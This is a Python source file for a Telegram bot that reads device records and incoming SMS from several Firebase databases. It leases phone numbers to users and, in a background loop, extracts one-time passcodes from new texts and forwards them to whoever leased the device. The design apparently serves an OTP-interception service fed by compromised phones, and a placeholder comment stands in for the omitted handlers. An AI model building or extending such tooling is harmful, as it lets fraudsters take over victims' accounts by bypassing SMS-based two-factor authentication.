import asyncio, os, time, logging, random
from aiohttp import web
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

# Import from our files
import database as db
import firebase_utils as fbu

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
log = logging.getLogger("OTP-Bot")

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
OWNER_ID = 8480878371
PORT = int(os.getenv("PORT", 8080))

router = Router()
running_bots = {}
active_scans = {}

class AdminStates(StatesGroup):
    add_bulk_urls = State()

async def get_owner_stats():
    data = db.load_data()
    fbs = data.get("firebases", [])
    total_devices, online_devices, fb_stats = 0, 0, {}
    for fb in fbs:
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        fb_online = 0
        if clients and isinstance(clients, dict):
            total_devices += len(clients)
            for dev_id, dev_data in clients.items():
                if isinstance(dev_data, dict) and dev_data.get("status") is True:
                    fb_online += 1
                    online_devices += 1
        label = fb['label']
        if label not in fb_stats: fb_stats[label] = {"total": 0, "online": 0}
        fb_stats[label]["total"] += len(clients) if clients else 0
        fb_stats[label]["online"] += fb_online
    return total_devices, online_devices, fb_stats

async def get_numbers_for_server(server_url, uid):
    data = db.load_data()
    fb = next((f for f in data.get("firebases", []) if f["url"] == server_url), None)
    if not fb: return None, None, None, []

    clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
    if not clients: return None, None, None, []

    online_devices = []
    for dev_id, dev_data in clients.items():
        if isinstance(dev_data, dict) and dev_data.get("status") is True:
            online_devices.append((fb, dev_id, dev_data))
    
    if not online_devices: return None, None, None, []

    usage_data = data.get("device_usage", {})
    online_devices.sort(key=lambda x: usage_data.get(x[1], 0))
    
    selected_fb, selected_dev_id, dev_data = online_devices[0]
    
    usage_count = usage_data.get(selected_dev_id, 0)
    data.setdefault("device_usage", {})[selected_dev_id] = usage_count + 1
    db.save_data(data)

    # Fix ?T issue
    battery = str(dev_data.get("battery", "100")).replace("%", "").strip()
    if not battery or battery == "?": battery = "100"
    status = "T" if dev_data.get("status") else "F"
    code = f"{battery}{status}"
    
    url = f"{selected_fb['url']}/messages/{selected_dev_id}.json?orderBy=%22%24key%22&limitToLast=500"
    msgs_dict = await fbu.fetch_fb(url, selected_fb.get("auth"))
    msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
    
    best_nums = fbu.extract_best_numbers(dev_data, msgs)
    user_hist = data.get("user_history", {}).get(str(uid), {})
    available = [n for n in best_nums if n[0] not in user_hist]
    
    return selected_dev_id, code, usage_count, available

async def get_latest_messages_for_fb(fb_url, auth):
    all_msgs = {}
    clients = await fbu.fetch_fb(f"{fb_url}/clients.json", auth)
    if not clients: return all_msgs
    for dev_id in clients.keys():
        msgs = await fbu.fetch_fb(f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", auth)
        if msgs:
            for k, v in msgs.items():
                if isinstance(v, dict) and v.get("type") == "incoming":
                    if int(v.get("id", 0)) > all_msgs.get(dev_id, {}).get("id", 0):
                        all_msgs[dev_id] = v
    return all_msgs

async def background_global_scanner():
    log.info("Global Scanner Started...")
    while True:
        try:
            data = db.load_data()
            fbs = data.get("firebases", [])
            leases = data.get("user_leases", {})
            
            device_to_users = {}
            current_time = time.time()
            for uid, lease in leases.items():
                if current_time < lease["expire_at"] and "dev_id" in lease:
                    device_to_users.setdefault(lease["dev_id"], []).append(uid)
            
            if not device_to_users:
                await asyncio.sleep(2)
                continue 
                
            otps_sent = 0
            for fb in fbs:
                latest_msgs = await get_latest_messages_for_fb(fb["url"], fb.get("auth"))
                for dev_id, msg in latest_msgs.items():
                    key = (fb["url"], dev_id)
                    msg_id = int(msg.get("id", 0))
                    old_id = active_scans.get(key, 0)
                    
                    if msg_id > old_id:
                        active_scans[key] = msg_id
                        if old_id != 0: 
                            text_content = msg.get("message", "")
                            otp = fbu.extract_otp(text_content)
                            if otp:
                                if dev_id in device_to_users:
                                    service = fbu.extract_service_name(text_content, msg.get("sender", ""))
                                    for uid in device_to_users[dev_id]:
                                        otp_msg = (
                                            f"🔔 <b>OTP Received!</b>\n\n"
                                            f"📱 <b>Service:</b> {service}\n"
                                            f"🔑 <b>OTP:</b> {otp}\n\n"
                                            f"💬 <b>Msg:</b> {text_content[:100]}..."
                                        )
                                        kb = InlineKeyboardMarkup(inline_keyboard=[
                                            [InlineKeyboardButton(text=f"📋 {otp}", copy_text=CopyTextButton(text=otp))]
                                        ])
                                        try:
                                            bot = running_bots.get(data.get("main_token", BOT_TOKEN))
                                            if bot: await bot.send_message(uid, otp_msg, reply_markup=kb, parse_mode="HTML")
                                            otps_sent += 1
                                        except Exception: pass
            if otps_sent > 0:
                d = db.load_data()
                d.setdefault("stats", {})["total_otps"] = d.get("stats", {}).get("total_otps", 0) + otps_sent
                db.save_data(d)
            await asyncio.sleep(2)
        except Exception as e:
            log.error(f"Scanner Error: {e}")
            await asyncio.sleep(5)

# ... (Add all the remaining handlers: start, admin_kb, manage_fb, user flow, etc. exactly as before) ...

async def main():
    log.info("Bot Started!")
    app = web.Application()
    app.router.add_get('/', lambda r: web.Response(text="Bot is running!"))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    log.info(f"Web server started on port {PORT}")

    main_bot = Bot(token=BOT_TOKEN)
    running_bots[BOT_TOKEN] = main_bot
    
    asyncio.create_task(background_global_scanner())
    
    dp_main = Dispatcher(storage=MemoryStorage())
    dp_main.include_router(router)
    await dp_main.start_polling(main_bot)

if __name__ == "__main__":
    asyncio.run(main())
